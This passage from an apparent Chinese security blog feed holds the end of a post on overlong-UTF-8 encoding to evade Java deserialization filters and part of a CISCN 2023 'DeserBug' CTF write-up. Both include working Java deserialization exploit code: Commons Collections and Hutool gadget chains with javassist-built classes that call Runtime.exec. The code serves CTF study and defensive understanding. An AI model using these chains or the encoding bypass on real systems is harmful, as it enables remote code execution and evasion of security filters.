&#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeUTF</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br>        charWriteThreeBytes(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡æµ‹è¯•"><a href="#ç»•è¿‡æµ‹è¯•" class="headerlink" title="ç»•è¿‡æµ‹è¯•"></a>ç»•è¿‡æµ‹è¯•</h2><p>è¿™é‡Œç›´æ¥æ‰“ä¸€ä¸ªæ™®é€šcc6çš„é“¾å­æ¥æµ‹è¯•æ˜¯å¦å¯ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.overlong;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.clown.Utils.CustomObjectOutputStream;<br><span class="hljs-keyword">import</span> org.clown.Utils.UTF8OutputStream;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//è¿™é‡Œå¾…ä¼šè°ƒç”¨çš„æ—¶å€™ä¼šåœ¨mpaæ–°å¢åŠ ä¸€ä¸ªé”®å€¼å¯¹aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br><span class="hljs-comment">//        serialize(hashMap);</span><br><span class="hljs-comment">//        serialize1(hashMap);</span><br><span class="hljs-comment">//        serialize2(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser2.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        CustomObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//æ­£å¸¸åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize1</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//é‡å†™writeUTFçš„åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize2</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        UTF8OutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å»çœ‹ä¸€ä¸‹ä½¿ç”¨å‰åå­—èŠ‚æµçš„å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241022221131584.png" alt="image-20241022221131584"></p><p><img src="https://cdn.clown2024.cn/image-20241022221119279.png" alt="image-20241022221119279"></p><p>å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯æˆåŠŸå˜æˆä¸å¯è¯»çš„ç±»åäº†,ååºåˆ—åŒ–ä¹Ÿæ˜¯èƒ½æ­£å¸¸å¼¹è®¡ç®—å™¨çš„</p><p><img src="https://cdn.clown2024.cn/image-20241022221255341.png" alt="image-20241022221255341"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/13932?accounttraceid=6f1030b220f8464eb2815f87796f4570daql&time__1311=eqRxyDcGG=k8D/D0D5IheGuDYwe=jDQwhD&alichlgref=https://account.aliyun.com/&u_atoken=569ca1e0aebe29a9b429829147e2aae3&u_asig=0a472f9217296064164077608e011c">javaåŸç”Ÿååºåˆ—åŒ–OverlongEncodingåˆ†æåŠå®æˆ˜ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg">UTF-8 Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2023å›½èµ›DeserBugå¤ç°</title>
      <link href="/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>è™½è¯´é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ç”±äºjavaé¢˜ç›®åšçš„è¿˜ä¸æ˜¯å¾ˆå¤šä¸å¤ªç†Ÿæ‚‰ï¼Œè€Œä¸”javaåŸºç¡€ä¸ç‰¢ï¼Œå¯¼è‡´ä¸€äº›ç‚¹è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><h1 id="deserbugé¢˜ç›®"><a href="#DeserBugé¢˜ç›®" class="headerlink" title="DeserBugé¢˜ç›®"></a>DeserBugé¢˜ç›®</h1><p>jadxåç¼–è¯‘æºç </p><p><img src="https://cdn.clown2024.cn/202410151633485.png" alt="image-20241015163331429"></p><p>Testappè¿™é‡Œï¼Œç›´æ¥æ ¹ç›®å½•ä¼ ä¸€ä¸ªbugstrå‚æ•°ï¼Œç„¶åå°†å†…å®¹base64è§£ç åååºåˆ—åŒ–</p><p>Myexpectæ˜¯ä¸€ä¸ªå¼‚å¸¸ç±»ï¼Œæ²¡çœ‹å‡ºæœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹</p><p>ç„¶åé¢˜ç›®é™„ä»¶è¿˜ç»™äº†ä¸¤ä¸ªåŒ…commons-collections-3.2.2.jarï¼Œhutool-all-5.8.18.jar</p><p><img src="https://cdn.clown2024.cn/202410151633951.png" alt="image-20241015163239379"></p><p>ç‰¹æ„ç»™äº†ä¸€ä¸ª3.2.2æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŒæŸ¥äº†ä¸€ä¸‹commons-collectionsä»3.2.2ç‰ˆæœ¬å¼€å§‹å°è¯•åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–InvokerTransformerç±»éƒ½ä¼šæŠ›å‡ºUnsupportedOperationExceptionå¼‚å¸¸</p><blockquote><p>ä¸”è¯¥ç‰ˆæœ¬åœ¨ä¸€äº›å±é™©çš„Transformerå®ç°ç±»çš„readObjectå‰åŠ ä¸Šäº†FunctorUtils#checkUnsafeSerializationæ¥æ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚</p></blockquote><p>ç„¶åæ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œå»çœ‹wpå½“æ—¶é¢˜ç›®è¿˜ç»™äº†ä¸¤ä¸ªæç¤º</p><blockquote><ol><li>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</li><li>jdk8u202(è¿™ä¸ªæœ¬åœ°æµ‹è¯•æ²¡ä»€ä¹ˆå½±å“)</li></ol></blockquote><p>æˆ‘å°±è¯´é‚£ä¸ªç‰¹åœ°å†™çš„Myexpectç±»æ€ä¹ˆä¼šæ²¡ç”¨ï¼ˆ</p><p>ä¼°è®¡è¿™ä¸­é—´å°±æ˜¯ç»™äº†ä¸€æ®µé“¾å­çš„æç¤ºä¸ç”¨è‡ªå·±æŒ–</p><p>æˆ‘ä»¬ç°åœ¨å°±æ ¹æ®æç¤ºå»çœ‹ä¸€ä¸‹ä»–çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ¬åœ°å·¥ç¨‹å¯¼å…¥ä»–ç»™çš„jaråŒ…æ¥çœ‹</p><p>çœ‹åˆ°com.app.Myexpect#getAnyexcept</p><p><img src="https://cdn.clown2024.cn/202410151634172.png" alt="image-20241015163448121"></p><p>è¿™é‡Œæœ‰ä¸ªnewInstanceï¼Œåº”è¯¥å°±æ˜¯æœ€åè¦æ‰§è¡Œçš„åœ°æ–¹ï¼Œå°±å¯ä»¥ç”¨åˆ°TemplatesImplçš„é“¾å­</p><p>emmm Hutoolæ²¡æ‰¾å‡ºæ¥åˆ©ç”¨é“¾ï¼Œæ‰“äº†ä¸ªcc3è¯•äº†ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410151635530.png" alt="image-20241015163503477"></p><p>InstantiateTransformerè¿™ä¸ªç±»ä¹Ÿç”¨ä¸äº†ï¼Œä¸ä¼šäº†çœ‹wpäº†</p><p>wpæ–‡ç« ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/136748656">https://blog.csdn.net/uuzeray/article/details/136748656</a></p><p>çœ‹äº†ä¹‹åå‘ç°å…¶å®æ˜¯æœ‰ç‚¹åˆç†çŒœæµ‹çš„æ€è·¯åœ¨é‡Œé¢ï¼Œå¹¶æ²¡æœ‰å®Œå…¨è°ƒè¯•ï¼Œè¿™ä¹Ÿæ˜¯å’Œjavaçš„ç‰¹æ€§æœ‰å…³</p><p>å»çœ‹JSONObject</p><p><img src="https://cdn.clown2024.cn/202410151635818.png" alt="image-20241015163529771"></p><p>å¯ä»¥çŸ¥é“ä»–æ˜¯ä¸€ä¸ªmapï¼Œä»–çš„putæ–¹æ³•å°±ç›¸å½“äºæ˜¯map.put</p><p>é‚£putæ–¹æ³•åˆè¯¥æ€ä¹ˆæ ·è°ƒç”¨å‘¢ï¼Œæˆ‘ä»¬çš„lazyMap#getæ˜¯å¯ä»¥è°ƒç”¨putæ–¹æ³•çš„</p><p><img src="https://cdn.clown2024.cn/202410151635507.png" alt="image-20241015163539460"></p><p>å¦‚æœkeyä¸å­˜åœ¨ä»–å°±ä¼šè°ƒç”¨putæ–¹æ³•ï¼Œä»¤æˆ‘ä»¬çš„mapä¸ºJSONObjectå³å¯ï¼Œç„¶åJSONObjectå› ä¸ºæ˜¯mapï¼Œæˆ‘ä»¬å­˜å…¥çš„valueæ˜¯objectçš„è¯ï¼Œä»–å°±ä¼šéœ€è¦è·å–å¯¹è±¡ç›¸å…³å±æ€§ä¿¡æ¯ï¼Œé‚£æ€ä¹ˆè·å–ï¼Œåº”è¯¥å°±æ˜¯éœ€è¦é€šè¿‡getteræ–¹æ³•ï¼Œæ‰€ä»¥å°±è§¦å‘äº†æˆ‘ä»¬çš„getAnyexceptæ–¹æ³•</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥èµ°cc5çš„BadAttributeValueExpExceptioné‚£æ¡é“¾å­åˆ°lazyMap#getçš„é‚£éƒ¨åˆ†ï¼Œç„¶åå†æ‹¼ä¸ŠJSONObjectçš„é‚£éƒ¨åˆ†é“¾å­</p><p>æœ€ç»ˆé“¾å­å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject --&gt; TiedMapEntry#toString --&gt; LazyMap#get --&gt; JSONObject#put --&gt; Myexpect#getAnyexcept --&gt; è§¦å‘æ¶æ„ç±»<br></code></pre></td></tr></table></figure><h2 id="å¼€å§‹å‡ºé”™"><a href="#å¼€å§‹å‡ºé”™" class="headerlink" title="å¼€å§‹å‡ºé”™"></a>å¼€å§‹å‡ºé”™</h2><p>ç¬¬ä¸€æ¬¡è‡ªå·±å†™æˆ‘æ˜¯æƒ³ç›´æ¥å°†æ¶æ„ç±»æ”¾åˆ°Myexpectä¸Šæ¥è§¦å‘çš„ï¼Œä½†æ˜¯ä»–å¹¶ä¸è¡Œï¼Œåæ¥å‘ç°æ˜¯æˆ‘javassistå†™é”™äº†</p><p>ç¬¬ä¸€æ¬¡exp(ä½†æ˜¯è¿œç¨‹ä¸é€šï¼Œå…¶å®æœ¬åœ°ä¹Ÿé€šä¸äº†ğŸ˜…)</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> clazz.toClass();<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        setValue(myexpect,<span class="hljs-string">&quot;targetclass&quot;</span>,aClass); <span class="hljs-comment">//è®¾ç½®targetClassä¸ºæ¶æ„ç±»</span><br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5éƒ¨åˆ†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;aaa&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹valå±æ€§</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//ç”Ÿæˆbase64åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//ä¸€å®šè¦è®°å¾—urlç¼–ç ä¸ç„¶æ‰“ä¸é€š</span><br><br><span class="hljs-comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArray);</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±é‡ä¸Šä¸€ä¸ªéå¸¸å¥‡æ€ªçš„é—®é¢˜äº†ï¼Œä»–ç°åœ¨åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼¹è®¡ç®—å™¨ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šï¼Œä½†æ˜¯å½“æˆ‘åœ¨æœ¬åœ°æŠŠåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¿å‡ºæ¥ååºåˆ—åŒ–çš„æ—¶å€™ä»–åˆèƒ½å¼¹äº†å†å½“æˆ‘å»æ‰“è¿œç¨‹çš„æ—¶å€™ä»–æ‰“ä¸é€šï¼Œåªå›æ˜¾ä¸€ä¸ª</p><p><img src="https://cdn.clown2024.cn/202410151636267.png" alt="image-20241015163624227"></p><p>åæ¥åˆå‘ç°ä¸Šé¢çš„çš„lazyMapä¹Ÿå†™é”™äº†ï¼Œåº”è¯¥æ˜¯è¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer(myexpect));<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¿™æ ·æ‰èƒ½ä¿è¯æˆ‘ä»¬putè¿›å»çš„valueæ˜¯Myexpectç±»ï¼Œå› 